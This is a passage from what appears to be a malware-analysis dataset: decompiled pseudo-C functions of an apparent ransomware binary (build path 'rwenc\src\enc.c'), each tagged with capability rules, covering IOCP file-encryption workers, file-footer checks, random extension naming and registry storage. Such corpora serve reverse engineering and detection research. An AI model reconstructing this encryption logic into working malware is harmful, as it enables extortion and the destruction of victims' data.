uVar14 << 0x20;\n                            uVar13 = uVar14 << 8 | cVar7 << 4 | uVar10;\n                            uVar14 = extraout_EDX_00;\n                        }\n                        uVar8 = uVar13;\n                        puVar16 = puVar15;\n                        iVar11 = var_4ch;\n                        ppiVar17 = var_ch;\n                        if (uVar13 < 0x80) {\n                            if (var_4ch == 0) {\n                                *(piVar19 + var_14h) = uVar8;\n                            }\n                            piVar19 = piVar19 + 1;\n                            arg_10h = piVar19;\n                        }\n                        else if (uVar13 < 0x800) {\n                            if (var_4ch == 0) {\n                                *(piVar19 + var_14h) = uVar13 >> 6 | 0xc0;\n                                *(piVar19 + 1 + var_14h) = uVar8 & 0x3f | 0x80;\n                                piVar19 = piVar19 + 2;\n                                arg_10h = piVar19;\n                            }\n                            else {\n                                piVar19 = piVar19 + 2;\n                                arg_10h = piVar19;\n                            }\n                        }\n                        else if (uVar13 < 0x10000) {\n                            if (var_4ch == 0) {\n                                *(piVar19 + var_14h) = uVar13 >> 0xc | 0xe0;\n                                *(piVar19 + 1 + var_14h) = uVar13 >> 6 & 0x3f | 0x80;\n                                *(piVar19 + 2 + var_14h) = uVar8 & 0x3f | 0x80;\n                                piVar19 = piVar19 + 3;\n                                arg_10h = piVar19;\n                            }\n                            else {\n                                piVar19 = piVar19 + 3;\n                                arg_10h = piVar19;\n                            }\n                        }\n                        else if (var_4ch == 0) {\n                            *(piVar19 + var_14h) = uVar13 >> 0x12 | 0xf0;\n                            *(piVar19 + 1 + var_14h) = uVar13 >> 0xc & 0x3f | 0x80;\n                            *(piVar19 + 2 + var_14h) = uVar13 >> 6 & 0x3f | 0x80;\n                            *(piVar19 + 3 + var_14h) = uVar8 & 0x3f | 0x80;\n                            piVar19 = piVar19 + 1;\n                            arg_10h = piVar19;\n                        }\n                        else {\n                            piVar19 = piVar19 + 1;\n                            arg_10h = piVar19;\n                        }\n                        goto code_r0x0040db1a;\n                    }\n                    iVar11 = var_4ch;\n                    if (var_4ch == 0) {\n                        *(piVar19 + var_14h) = 9;\n                    }\n                }\ncode_r0x0040d2d1:\n                piVar19 = piVar19 + 1;\n                arg_10h = piVar19;\n            }\n        }\ncode_r0x0040db1a:\n        puVar16 = puVar16 + 1;\n        uVar5 = *0x4129b8;\n    } while( true );\n    var_4ch = var_4ch + -1;\n    var_20h = var_18h;\n    puVar16 = var_34h;\n    if (var_4ch < 0) {\n        return var_18h;\n    }\n    goto code_r0x0040cfaf;\n}\n",
        "token_count": 7986
    },
    "00401526": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00401526(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *arg_8h;\n    uint uVar3;\n    uint var_164h;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    code *var_14ch;\n    code *var_148h;\n    uint uStack328;\n    uint uStack324;\n    uint var_13ch;\n    ushort var_132h;\n    uint var_130h;\n    ushort var_126h;\n    uint *var_124h;\n    uint var_120h;\n    code *var_11ch;\n    uint *var_118h;\n    uint var_114h;\n    code *var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    code *var_104h;\n    uint *var_100h;\n    uint var_fch;\n    code *var_f8h;\n    uint *var_f4h;\n    uint var_f0h;\n    code *var_ech;\n    uint *var_e8h;\n    uint var_e4h;\n    code *var_e0h;\n    uint *var_dch;\n    uint var_d8h;\n    code *var_d4h;\n    uint *var_d0h;\n    uint var_cch;\n    code *var_c8h;\n    uint *var_c4h;\n    uint var_c0h;\n    code *var_bch;\n    uint *var_b8h;\n    uint var_b4h;\n    code *var_b0h;\n    uint *var_ach;\n    uint var_a8h;\n    code *var_a4h;\n    uint *var_a0h;\n    uint var_9ch;\n    code *var_98h;\n    uint *var_94h;\n    uint var_90h;\n    code *var_8ch;\n    uint *var_88h;\n    uint var_84h;\n    code *var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    code *var_74h;\n    uint var_70h;\n    uint var_68h;\n    uint var_64h;\n    uchar var_5fh;\n    uint var_5ch;\n    int32_t var_57h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar var_10h [8];\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401b99();\n    if (iVar1 != 0) {\n        uVar3 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(7, L\"[DBG] \", uVar3);\n        fcn.00405082(8, L\"cfg:%S\\r\\n\", iVar1);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        var_154h = 0;\n        var_150h = 0;\n        uStack328 = 0;\n        uStack324 = 0;\n        var_14ch = fcn.00405197;\n        var_148h = fcn.004051e4;\n        uVar3 = fcn.00406c91(iVar1);\n        iVar2 = fcn.0040cf32(&var_154h, iVar1, uVar3);\n        var_50h = iVar2;\n        if (iVar2 == 0) {\n            fcn.004051e4(iVar1);\n        }\n        else {\n            fcn.00406625(0x413060, 0x954, 0xb, 2, &var_4h);\n            var_4h._2_1_ = 0;\n            fcn.00406625(0x413060, 0x650, 9, 3, &var_14h);\n            var_14h._3_1_ = 0;\n            fcn.00406625(0x413060, 0x20f, 0xc, 3, &var_18h);\n            var_18h._3_1_ = 0;\n            fcn.00406625(0x413060, 0x971, 10, 3, &var_1ch);\n            var_1ch._3_1_ = 0;\n            fcn.00406625(0x413060, 0x1d0, 0xd, 3, &var_20h);\n            var_20h._3_1_ = 0;\n            fcn.00406625(0x413060, 0x5a4, 10, 4, &var_3ch);\n            var_38h._0_1_ = 0;\n            fcn.00406625(0x413060, 0x36b, 4, 4, &var_44h);\n            var_40h._0_1_ = 0;\n            fcn.00406625(0x413060, 0x378, 0xc, 3, &var_24h);\n            var_24h._3_1_ = 0;\n            fcn.00406625(0x413060, 0x475, 4, 3, &var_28h);\n            var_28h._3_1_ = 0;\n            fcn.00406625(0x413060, 0x2c8, 0xe, 3, &var_2ch);\n            var_2ch._3_1_ = 0;\n            fcn.00406625(0x413060, 0x915, 10, 3, &var_30h);\n            var_30h._3_1_ = 0;\n            fcn.00406625(0x413060, 0x2b6, 6, 5, &var_5ch);\n            var_57h._0_1_ = 0;\n            fcn.00406625(0x413060, 0x822, 9, 5, &var_64h);\n            var_5fh = 0;\n            fcn.00406625(0x413060, 0x8db, 0x10, 3, &var_34h);\n            var_34h._3_1_ = 0;\n            fcn.00406625(0x413060, 0x98c, 6, 4, &var_4ch);\n            var_124h = &var_4h;\n            var_fch = 6;\n            var_118h = &var_14h;\n            var_48h._0_1_ = 0;\n            var_10ch = &var_18h;\n            var_11ch = fcn.00401194;\n            var_100h = &var_1ch;\n            var_f4h = &var_20h;\n            var_e8h = &var_3ch;\n            var_dch = &var_44h;\n            var_d0h = &var_24h;\n            var_120h = 5;\n            var_114h = 5;\n            var_110h = fcn.00401175;\n            var_108h = 5;\n            var_104h = fcn.00401251;\n            var_f8h = fcn.0040106b;\n            var_f0h = 1;\n            var_ech = fcn.00401306;\n            var_e4h = 2;\n            var_e0h = fcn.004013a0;\n            var_d8h = 6;\n            var_d4h = fcn.004013d2;\n            var_c4h = &var_28h;\n            var_b8h = &var_2ch;\n            var_ach = &var_30h;\n            var_a0h = &var_5ch;\n            var_94h = &var_64h;\n            var_88h = &var_34h;\n            var_7ch = &var_4ch;\n            var_cch = 2;\n            var_c8h = fcn.004011f1;\n            var_c0h = 2;\n            var_bch = fcn.00401221;\n            var_b4h = 5;\n            var_b0h = fcn.0040107e;\n            var_a8h = 6;\n            var_a4h = fcn.00401103;\n            var_9ch = 5;\n            var_98h = fcn.00401116;\n            var_90h = 5;\n            var_8ch = fcn.00401156;\n            var_84h = 5;\n            var_80h = fcn.004010c3;\n            var_78h = 6;\n            var_74h = fcn.004010b0;\n            iVar2 = fcn.0040748b(iVar2, &var_124h, 0xf);\n            fcn.0040db7c(&var_154h, var_50h);\n            fcn.004051e4(iVar1);\n            if (iVar2 != 0) {\n                *0x4215f4 = fcn.004022d8();\n                fcn.00406625(0x413060, 0x8f8, 0xf, 8, var_10h);\n                var_8h._0_2_ = 0;\n                fcn.00406625(0x413060, 0x3d4, 8, 8, &var_70h);\n                var_68h._0_2_ = 0;\n                fcn.00406625(0x413060, 0x839, 0xe, 10, &var_130h);\n                var_126h = 0;\n                *0x4215ec = fcn.00406582(0x4214e0, 0x20, 0);\n                *0x4215f0 = fcn.0040587c();\n                if (*0x4215f0 == 0) {\n                    *0x4215f0 = fcn.00406c56(var_10h);\n                }\n                *0x4215e8 = fcn.00401ca6();\n                *0x4215f8 = fcn.004059b9();\n                if (*0x4215f8 == 0) {\n                    *0x4215f8 = fcn.00406c56(var_10h);\n                }\n                *0x4215fc = fcn.004054e1();\n                if (*0x4215fc == 0) {\n                    *0x4215fc = fcn.00406c56(var_10h);\n                }\n                *0x421600 = fcn.00405691();\n                if (*0x421600 == 0) {\n                    *0x421600 = fcn.00406c56(var_10h);\n                }\n                *0x421604 = fcn.004057ad();\n                if (*0x421604 == 0) {\n                    *0x421604 = fcn.00406c56(var_10h);\n                }\n                iVar1 = fcn.00405b24();\n                arg_8h = &var_70h;\n                if (iVar1 == 0) {\n                    arg_8h = &var_130h;\n                }\n                *0x421608 = fcn.00406c56(arg_8h);\n                *0x42160c = fcn.00405943();\n                if (*0x42160c == 0) {\n                    *0x42160c = fcn.00406c56(var_10h);\n                }\n                uVar3 = fcn.00405526(&var_57h + 3);\n                *0x421610 = fcn.00406582(uVar3, stack0xffffffa8 * 0x16, 0);\n                fcn.004051e4(uVar3);\n                iVar1 = fcn.00405c6b();\n                *0x421670 = (-(iVar1 != 0) & 0xffffffea) + 0x56;\n                fcn.00402162();\n                fcn.0040224c();\n                fcn.00401fd6();\n                fcn.00406625(0x413060, 0x66e, 4, 0xc, &var_164h);\n                var_158h._0_2_ = 0;\n                fcn.00406625(0x413060, 0x40e, 0x10, 10, &var_13ch);\n                var_132h = 0;\n                iVar1 = fcn.004013e5(&var_164h);\n                *0x421688 = iVar1 == 0;\n                *0x42168c = fcn.004013e5(&var_13ch);\n                if (((((*0x4215ec != 0) && (*0x4215f0 != 0)) && (*0x4215f4 != 0)) &&\n                    ((((*0x4215e8 != 0 && (*0x4215f8 != 0)) &&\n                      ((*0x4215fc != 0 && ((*0x421600 != 0 && (*0x421604 != 0)))))) && (*0x421608 != 0)))) &&\n                   ((((*0x42160c != 0 && (*0x421610 != 0)) && (*0x4215dc != 0)) &&\n                    ((*0x4215e0 != 0 && (*0x4215e4 != 0)))))) {\n                    return 1;\n                }\n                return 0;\n            }\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 3179
    },
    "00401ca6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00401ca6(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint var_68h;\n    uint var_1ah;\n    int32_t var_ah;\n    int32_t var_4h;\n    \n    fcn.00406625(0x413060, 0x4ca, 6, 0x4e, &var_68h);\n    var_1ah._0_2_ = 0;\n    fcn.00406625(0x413060, 1999, 7, 0xe, &var_1ah + 2);\n    var_ah._0_2_ = 0;\n    arg_8h = fcn.00405f4f(0x80000002, &var_68h, &var_1ah + 2, &var_ah + 2, &var_4h);\n    if ((arg_8h != 0) || (arg_8h = fcn.00405f4f(0x80000001, &var_68h, &var_1ah + 2, &var_ah + 2, &var_4h),  arg_8h != 0)\n       ) {\n        if (stack0xfffffff4 == 1) goto code_r0x00401dc1;\n        if (arg_8h != 0) {\n            fcn.004051e4(arg_8h);\n        }\n    }\n    arg_8h = fcn.004026ea(5, 10);\n    while( true ) {\n        if (arg_8h == 0) {\n            return 0;\n        }\n        iVar1 = fcn.00407267(0x42162c, arg_8h + 2);\n        if (iVar1 == 0) break;\n        fcn.004051e4(arg_8h);\n        arg_8h = fcn.004026ea(5, 10);\n    }\n    iVar1 = fcn.00406ca4(arg_8h);\n    var_4h = iVar1 * 2 + 2;\n    iVar1 = fcn.00405fcd(0x80000002, &var_68h, &var_1ah + 2, 1, arg_8h, var_4h);\n    if (iVar1 == 0) {\n        fcn.00405fcd(0x80000001, &var_68h, &var_1ah + 2, 1, arg_8h, var_4h);\n    }\ncode_r0x00401dc1:\n    fcn.004073ab(0x42162c, arg_8h + 2);\n    return arg_8h;\n}\n",
        "token_count": 624
    },
    "00401fa6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401fa6(int32_t arg_8h)\n\n{\n    uint *arg_8h_00;\n    int32_t iVar1;\n    \n    iVar1 = *(arg_8h + 8);\n    while (iVar1 != 0) {\n        arg_8h_00 = *(arg_8h + 8);\n        *(arg_8h + 8) = arg_8h_00[1];\n        fcn.004051e4(*arg_8h_00);\n        fcn.004051e4(arg_8h_00);\n        iVar1 = *(arg_8h + 8);\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "004026ea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.004026ea(int32_t arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint arg_ch_00;\n    int16_t *piVar5;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        piVar3 = NULL;\n    }\n    else {\n        piVar2 = fcn.00405e1e(arg_8h, arg_ch);\n        piVar3 = piVar2;\n        if ((piVar2 != NULL) && (piVar3 = fcn.00405197(piVar2 * 2 + 4),  piVar3 != NULL)) {\n            *piVar3 = 0x2e;\n            piVar5 = piVar3;\n            for (; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                piVar5 = piVar5 + 1;\n                iVar4 = fcn.00405e1e(0, 1);\n                arg_ch_00 = 9;\n                if (iVar4 != 0) {\n                    arg_ch_00 = 0x19;\n                }\n                iVar1 = fcn.00405e1e(0, arg_ch_00);\n                *piVar5 = iVar1 + *(iVar4 * 2 + 0x40f070);\n            }\n        }\n    }\n    return piVar3;\n}\n",
        "token_count": 335
    },
    "004027e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004027e9(uint noname_0, int32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t arg_10h_00;\n    uint uVar4;\n    uint var_8ch;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5eh;\n    uint var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n    pcVar1 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    arg_10h_00 = 0;\n    if (0 < arg_ch) {\n        do {\n            uVar4 = 0x4216a0;\n            (*pcVar1)();\n            fcn.00405082(7, L\"[DBG] \", uVar4);\n            fcn.00405082(8, L\"Event occurred %d/%d\\r\\n\", arg_10h_00);\n            (*pcVar2)(0x4216a0);\n            var_4h = *(arg_10h + arg_10h_00 * 4);\n            fcn.00406625(0x413060, 0x3f3, 7, 0xe, &var_6ch);\n            var_5eh._0_2_ = 0;\n            var_8h = (**(*var_4h + 0x10))(var_4h, &var_6ch, 0, &var_20h, 0, 0);\n            if (var_8h == 0) {\n                if (var_20h == 8) {\n                    uVar4 = 0x4216a0;\n                    (*pcVar1)();\n                    fcn.00405082(7, L\"[DBG] \", uVar4);\n                    fcn.00405082(8, L\"%s\\r\\n\", var_18h);\n                    (*pcVar2)(0x4216a0);\n                }\n                (*str._nz_Is._0_4_)(&var_20h);\n            }\n            else {\n                uVar4 = 0x4216a0;\n                (*pcVar1)();\n                fcn.00405082(7, L\"[DBG] \", uVar4);\n                fcn.00405082(8, L\"error: 0x%Xh\\r\\n\", var_8h);\n                (*pcVar2)(0x4216a0);\n            }\n            fcn.00406625(0x413060, 0xad7, 8, 0x1c, &var_8ch);\n            var_70h._0_2_ = 0;\n            var_8h = (**(*var_4h + 0x10))(var_4h, &var_8ch, 0, &var_20h, 0, 0);\n            if (var_8h == 0) {\n                iVar3 = (***var_18h)(var_18h, 0x40f9c0, &var_ch);\n                if (iVar3 == 0) {\n                    var_4h = NULL;\n                    fcn.00406625(0x413060, 0x31b, 4, 8, &var_2ch);\n                    var_24h._0_2_ = 0;\n                    iVar3 = (**(*var_ch + 0x10))(var_ch, &var_2ch, 0, &var_3ch, 0, 0);\n                    if (iVar3 == 0) {\n                        uVar4 = 0x4216a0;\n                        (*pcVar1)();\n                        fcn.00405082(7, L\"[DBG] \", uVar4);\n                        fcn.00405082(8, L\"%s\\r\\n\", var_34h);\n                        (*pcVar2)(0x4216a0);\n                        var_4h = fcn.00402c39(var_34h);\n                        (*str._nz_Is._0_4_)(&var_3ch);\n                    }\n                    fcn.00406625(0x413060, 0x8b8, 5, 0xc, &var_5eh + 2);\n                    var_50h._0_2_ = 0;\n                    iVar3 = (**(*var_ch + 0x10))(var_ch, &var_5eh + 2, 0, &var_4ch, 0, 0);\n                    if (iVar3 == 0) {\n                        uVar4 = 0x4216a0;\n                        (*pcVar1)();\n                        fcn.00405082(7, L\"[DBG] \", uVar4);\n                        fcn.00405082(8, L\"%s\\r\\n\", var_44h);\n                        (*pcVar2)(0x4216a0);\n                        var_10h = (**0x413cb0)(var_44h);\n                        (*str._nz_Is._0_4_)(&var_4ch);\n                    }\n                    if (var_4h != NULL) {\n                        uVar4 = 0x4216a0;\n                        (*pcVar1)();\n                        fcn.00405082(7, L\"[DBG] \", uVar4);\n                        fcn.00405082(8, L\"found: %d\\r\\n\", var_10h);\n                        (*pcVar2)(0x4216a0);\n                        fcn.0040460c(var_10h);\n                    }\n                }\n                (*str._nz_Is._0_4_)(&var_20h);\n            }\n            else {\n                uVar4 = 0x4216a0;\n                (*pcVar1)();\n                fcn.00405082(7, L\"[DBG] \", uVar4);\n                fcn.00405082(8, L\"error: 0x%Xh\\r\\n\", var_8h);\n                (*pcVar2)(0x4216a0);\n            }\n            arg_10h_00 = arg_10h_00 + 1;\n        } while (arg_10h_00 < arg_ch);\n    }\n    return 0;\n}\n",
        "token_count": 1460
    },
    "00402ae3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ae3(uint noname_0, int32_t arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint arg_10h_00;\n    \n    if (arg_ch == 0) {\n        uVar1 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(7, L\"[DBG] \", uVar1);\n        fcn.00405082(8, L\"Call complete. hResult = 0x%X\\r\\n\", arg_10h);\n    }\n    else {\n        if (arg_ch != 2) {\n            return 0;\n        }\n        arg_10h_00 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        uVar1 = 7;\n        fcn.00405082(7, L\"[DBG] \", arg_10h_00);\n        fcn.00405082(8, L\"Call in progress.\\r\\n\", uVar1);\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    return 0;\n}\n",
        "token_count": 261
    },
    "00402e98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402e98(uint arg_8h, uint arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint arg_10h_00;\n    uint uVar5;\n    uint var_ech;\n    uint var_3ch;\n    int32_t var_14h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    bVar4 = true;\n    var_8h = 1;\n    iVar1 = fcn.004084b5(arg_ch, 0x80000000, 1, 3, 0);\n    if (iVar1 != 0) {\n        if ((arg_14h < 1) && ((arg_14h < 0 || (arg_10h < 0xe4)))) {\n            fcn.0040536d(iVar1);\n        }\n        else {\n            fcn.004084f4(iVar1, 0xffffff1c, 0xffffffff, 2);\n            iVar3 = fcn.004084db(iVar1, &var_ech, 0xe4, &var_4h);\n            if ((iVar3 == 0) || (var_4h != 0xe4)) {\n                bVar4 = false;\n            }\n            fcn.0040536d(iVar1);\n            if ((bVar4) && (iVar1 = fcn.00407642(0, &var_3ch, 0x20),  var_14h == iVar1)) {\n                return 0;\n            }\n        }\n    }\n    uVar2 = 0x100000;\n    if ((arg_14h < 1) && ((arg_14h < 0 || (arg_10h < 0x100000)))) {\n        uVar2 = arg_10h;\n    }\n    iVar1 = fcn.00408102(arg_8h, uVar2 + 0x158);\n    while( true ) {\n        if (iVar1 != 0) {\n            uVar5 = 0x4216a0;\n            *(iVar1 + 0x150) = uVar2;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n            fcn.00405082(7, L\"[DBG] \", uVar5);\n            fcn.00408161(arg_ch);\n            fcn.00405082(8, L\"open:%s:%08X:%llu\\r\\n\", arg_ch);\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n            do {\n                iVar3 = fcn.004081ff(iVar1, arg_ch, arg_10h, arg_14h, 0xc0000000, 0, 3);\n                if (iVar3 != 0) {\n                    fcn.004030d1(iVar1);\n                    return iVar1;\n                }\n                var_4h = fcn.00405c89();\n                uVar5 = 0x4216a0;\n                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n                fcn.00405082(0xc, L\"[ERR] \", uVar5);\n                fcn.00405c89();\n                fcn.00405082(4, L\" err:%s:%d\\r\\n\", arg_ch);\n                fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\rwenc\\\\src\\\\enc.c\");\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n                iVar3 = var_8h + -1;\n                bVar4 = var_8h != 0;\n                var_8h = iVar3;\n            } while ((bVar4) &&\n                    ((var_4h != 5 ||\n                     ((uVar2 = (**0x413c08)(arg_ch),  uVar2 != 0xffffffff &&\n                      (((uVar2 & 1) == 0 || (iVar3 = (**0x413d5c)(arg_ch, 0x80),  iVar3 != 0))))))));\n            fcn.00408116(arg_8h, iVar1);\n            return 0;\n        }\n        iVar1 = fcn.00405c89();\n        if (iVar1 != 8) break;\n        arg_10h_00 = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        uVar5 = 7;\n        fcn.00405082(7, L\"[DBG] \", arg_10h_00);\n        fcn.00405082(8, L\"IOCP ERROR_NOT_ENOUGH_MEMORY, retrying..\\r\\n\", uVar5);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        fcn.004060d2(100);\n        iVar1 = fcn.00408102(arg_8h, uVar2 + 0x158);\n    }\n    return 0;\n}\n",
        "token_count": 1126
    },
    "00403616": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403616(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    uVar4 = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    uVar3 = 7;\n    fcn.00405082(7, L\"[DBG] \", uVar4);\n    fcn.00405082(8, L\"start IOCP worker\\r\\n\", uVar3);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    fcn.004059f5();\n    iVar2 = fcn.0040812a(arg_8h, &var_8h, &var_ch, &var_4h, 0xffffffff);\n    while (*0x421350 == 0) {\n        if (iVar2 == 0) {\n            iVar2 = fcn.00405c89();\n            if (iVar2 == 0x26) {\n                fcn.00402d7e(arg_8h, var_4h);\n            }\n            else {\n                uVar3 = 0x4216a0;\n                (*pcVar1)();\n                fcn.00405082(0xc, L\"[ERR] \", uVar3);\n                fcn.00405082(4, L\"%d\\r\\n\", iVar2);\n                fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\rwenc\\\\src\\\\enc.c\");\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n            }\n        }\n        else {\n            fcn.0040827a(var_4h, var_8h, 0);\n            iVar2 = *(var_4h + 0x14c);\n            if (iVar2 == 0) {\n                fcn.00403312(arg_8h, var_4h, 1);\n            }\n            else if (iVar2 == 1) {\n                fcn.004037b9(var_4h, var_8h, -(*0x421684 != 0) & 2);\n            }\n            else if (iVar2 == 2) {\n                fcn.00403826(var_4h, 3);\n            }\n            else if (iVar2 == 3) {\n                fcn.0040322c(arg_8h, var_4h);\n            }\n        }\n        iVar2 = fcn.0040812a(arg_8h, &var_8h, &var_ch, &var_4h, 0xffffffff);\n    }\n    LOCK();\n    *(arg_8h + 8) = *(arg_8h + 8) + -1;\n    fcn.00405a9d();\n    uVar4 = 0x4216a0;\n    (*pcVar1)();\n    uVar3 = 7;\n    fcn.00405082(7, L\"[DBG] \", uVar4);\n    fcn.00405082(8, L\"end IOCP worker\\r\\n\", uVar3);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    return 0;\n}\n",
        "token_count": 757
    },
    "00403826": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403826(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    *(arg_8h + 0x14c) = arg_ch;\n    if (*0x421684 != 0) {\n        iVar2 = *(arg_8h + 0x24);\n        uVar1 = *(arg_8h + 0x20);\n        if ((-1 < iVar2) && ((0 < iVar2 || (0x100000 < uVar1)))) {\n            fcn.0040827a(arg_8h, uVar1 - 0x100000, iVar2 - (uVar1 < 0x100000));\n        }\n    }\n    iVar2 = fcn.00408294(arg_8h, arg_8h + 0x28, 0xe4);\n    while( true ) {\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00405c89();\n        if (iVar2 == 0x3e5) break;\n        fcn.004060d2(100);\n        iVar2 = fcn.00408294(arg_8h, arg_8h + 0x28, 0xe4);\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "00404642": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404642(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    if (arg_ch != 0) {\n        arg_ch_00 = fcn.00406a50(arg_ch);\n        iVar1 = fcn.00407267(0x421638, arg_ch_00);\n        if (iVar1 != 0) {\n            fcn.0040471f(arg_8h);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 118
    },
    "00405139": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
